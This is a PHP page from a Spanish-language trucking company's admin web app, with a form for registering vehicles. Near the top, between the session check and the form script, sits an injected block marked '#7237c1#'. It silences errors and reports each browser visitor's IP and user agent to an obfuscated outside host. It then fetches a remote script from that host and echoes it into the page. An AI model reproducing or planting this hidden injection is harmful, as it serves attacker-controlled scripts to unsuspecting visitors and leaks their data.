<?php
	session_start();
	if(!isset($_SESSION["usuario"]))
	{
		header("Location: index.html");
	}
	else if($_SESSION["tipo"]=="trab")
	{
		header("Location: trabajador..php");
	}
	require("../conexion/ajax.php");
?>
<?php
#7237c1#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/7237c1#
?>
<script language="javascript" type="text/javascript">
function validar()
{
	agregarCargando('cargando');
	placa = document.getElementById('txtPlaca').value;
	marca = document.getElementById('txtMarca').value;
	modelo = document.getElementById('txtModelo').value;
	nRegistro = document.getElementById('txtNRegistro').value;
	nCertif = document.getElementById('txtNCertificado').value;
	tara = document.getElementById('txtTara').value;
	pesoBruto = document.getElementById('txtPesoBruto').value;

	aNRegistro = parseInt(nRegistro);
	aNCertif = parseInt(nCertif);
	
	if(placa.length==0 || marca.length==0 || modelo.length==0 || nRegistro.length==0 || nCertif.length==0 || tara.length==0 || pesoBruto.length==0)
	{
		alert("¡ Debes llenar correctamente todos los campos !");
		quitarCargando('cargando');
		return;
	}	
	/*else if(isNaN(nRegistro) || aNRegistro.toString().length!=nRegistro.length) 
	{
		alert("¡ El nro. de registro debe ser un número entero !");
		quitarCargando('cargando');
		return;
	}*/
	/*else if(isNaN(nCertif) || aNCertif.toString().length!=nCertif.length) 
	{
		alert("¡ El nro. de certificado debe ser un número entero !");
		quitarCargando('cargando');
		return;
	}*/
	else if(isNaN(tara))
	{
		alert("¡ La tara debe ser un número !");
		quitarCargando('cargando');
		return;
	}
	else if(isNaN(pesoBruto))
	{
		alert("¡ El Peso Bruto debe ser un número !");
		quitarCargando('cargando');
		return;
	}
	anho = document.getElementById('cmbAnho').value;
	tipoV = document.getElementById('cmbTipoVehiculo').value;
	tipoC = document.getElementById('cmbTipoCombustible').value;
	numEjes = document.getElementById('cmbNEjes').value;
	
	_obj = crearObjeto();
	_url = "ajaxManejador.php";
	_valores = "op=reVehiculo&txtPlaca=" + placa + "&txtMarca=" + marca + "&txtModelo=" + modelo + "&txtNRegistro=" + nRegistro + "&txtNCertificado=" + nCertif + "&txtTara=" + tara + "&txtPesoBruto=" + pesoBruto + "&cmbAnho=" + anho + "&cmbTipoVehiculo=" + tipoV + "&cmbTipoCombustible=" + tipoC + "&cmbNEjes=" + numEjes;
	_obj.open("POST", _url, true);
	_obj.setRequestHeader('Content-Type','application/x-www-form-urlencoded'); //cabecera post
	_obj.send(_valores);
	_obj.onreadystatechange = function()
	{
		//Carga completa (Estado de la conexion)
		if(_obj.readyState==4)
		{
			//Completadoc no exito (Codigo enviado por el servidor)
			if(_obj.status==200)
			{
				resp = _obj.responseText;
				alert("¡ Vehiculo registrado correctamente !");
				document.getElementById('txtPlaca').value = "";
				document.getElementById('txtMarca').value = "";
				document.getElementById('txtModelo').value = "";
				document.getElementById('txtNRegistro').value = "";
				document.getElementById('txtNCertificado').value = "";
				document.getElementById('txtTara').value = "";
				document.getElementById('txtPesoBruto').value = "";				
			}
		}
	}
	quitarCargando('cargando');	
}

function go()
{
	location.href="administrador.php";
}
</script>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>:: Transportes Marin Hermanos - InsVehiculo ::</title>
<style type="text/css">
<!--
.Estilo1 {font-family: "Times New Roman", Times, serif}
.Estilo2 {font-weight: bold}
.Estilo6 {font-weight: bold; font-family: "Times New Roman", Times, serif; font-style: italic; }
-->
</style>
</head>
<body>
<table width="1003" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="156" background="../conexion/Img/bg1222.jpg">&nbsp;</td>
    <td width="780"><table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="819">&nbsp;</td>
      </tr>
      <tr>
        <td><img src="../imagenes/sup.jpg" width="780" height="193" /></td>
      </tr>
      <tr>
        <td height="263"><div align="center">
          <form id="form1" name="form1" method="post" action="">
            <table width="451" border="0">
              <tr>
                <td colspan="2"><div align="center"><strong>REGISTRAR NUEVO VEHICULO </strong></div></td>
                <td width="126">&nbsp;</td>
              </tr>
              <tr>
                <td width="149"><div align="justify" class="Estilo6">Placa : </div></td>
                <td width="162"><div align="justify" class="Estilo1">
                  <input name="txtPlaca" type="text" id="txtPlaca" maxlength="10" title="Placa" />
                </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Marca : </div></td>
                <td><label> <span class="Estilo1"> </span> </label>
                        <div align="justify" class="Estilo1">
                          <input name="txtMarca" type="text" id="txtMarca" maxlength="45" />
                      </div></td>
                <td><a href="http://www.mtc.gob.pe/trans_carga/a/rep_intra_mercancia.asp" target="blank">Datos de Vehiculos</a></td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Modelo : </div></td>
                <td><label> <span class="Estilo1"> </span> </label>
                        <div align="justify" class="Estilo1">
                          <input name="txtModelo" type="text" id="txtModelo" maxlength="45" />
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="32"><p align="justify" class="Estilo6">Nro Registro : </p></td>
                <td><label> <span class="Estilo1"> </span> </label>
                        <div align="justify" class="Estilo1">
                          <input name="txtNRegistro" type="text" id="txtNRegistro" maxlength="20" />
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Nro Inscripci&oacute;n: </div></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <input name="txtNCertificado" type="text" id="txtNCertificado" />
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Tara : </div></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <input name="txtTara" type="text" id="txtTara" />
                      </div></td>
                <td><div align="center" id="cargando"></div></td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Peso Bruto : </div></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <input name="txtPesoBruto" type="text" id="txtPesoBruto" />
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="23"><div align="justify" class="Estilo6">A&ntilde;o Fabric. : </div></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <select name="cmbAnho" id="cmbAnho">
                            <option selected="selected">2009</option>
                            <option>2008</option>
                            <option>2007</option>
                            <option>2006</option>
                            <option>2005</option>
                            <option>2004</option>
                            <option>2003</option>
                            <option>2002</option>
                            <option>2001</option>
                            <option>2000</option>
                            <option>1999</option>
                            <option>1998</option>
                            <option>1997</option>
                            <option>1996</option>
                            <option>1995</option>
                            <option>1994</option>
                            <option>1993</option>
                            <option>1992</option>
                            <option>1991</option>
                            <option>1990</option>
                            <option>1989</option>
                            <option>1988</option>
                            <option>1987</option>
                            <option>1986</option>
                            <option>1985</option>
                            <option>1984</option>
                            <option>1983</option>
                            <option>1982</option>
                            <option>1981</option>
                            <option>1980</option>
                            <option>1979</option>
                            <option>1978</option>
                            <option>1977</option>
                            <option>1976</option>
                            <option>1975</option>
                            <option>1974</option>
                            <option>1973</option>
                            <option>1972</option>
                            <option>1971</option>
                            <option>1970</option>
                          </select>
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><div align="justify" class="Estilo6">Tipo Vehiculo : </div></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <select name="cmbTipoVehiculo" id="cmbTipoVehiculo">
                            <option>Camion</option>
                            <option>Trailer</option>
                            <option>Camioneta</option>
                          </select>
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td><p align="justify" class="Estilo6">Tipo Combustible : </p></td>
                <td><span class="Estilo1">
                  <label> </label>
                  </span>
                        <div align="justify" class="Estilo1">
                          <select name="cmbTipoCombustible" id="cmbTipoCombustible">
                            <option>Gasolina</option>
                            <option>Petroleo</option>
                            <option>Gas</option>
                          </select>
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="43"><em><strong>
                  <label>   </label>
                  </strong>
                  </em>
                  <div align="justify" class="Estilo6">No Ejes : </div></td>
                <td><label> <span class="Estilo1"> </span> </label>
                        <div align="justify" class="Estilo1">
                          <select name="cmbNEjes" id="cmbNEjes">
                            <option>2</option>
                            <option>3</option>
                            <option>4</option>
                            <option>5</option>
                            <option>6</option>
                            <option>7</option>
                            <option>8</option>
                          </select>
                      </div></td>
                <td>&nbsp;</td>
              </tr>
              <tr>
                <td height="68"><div align="center">
                  <input type="button" name="registrar" value="Registrar" onClick="validar()"/>
                </div></td>
                <td><div align="center">
                  <input type="button" name="cancelar" value="Cancelar"  onclick="go()"/>
                </div></td>
                <td>&nbsp;</td>
              </tr>
            </table>
          </form>
        </div></td>
      </tr>
      <tr>
        <td bgcolor="#6DAA37">&nbsp;</td>
      </tr>
      <tr>
        <td bgcolor="#091549" class="Estilo2"><div align="center" class="Estilo2">Desarrollado por </div></td>
      </tr>
    </table></td>
    <td width="67" background="../conexion/Img/bg1223.jpg">&nbsp;</td>
  </tr>
</table>
</body>
</html>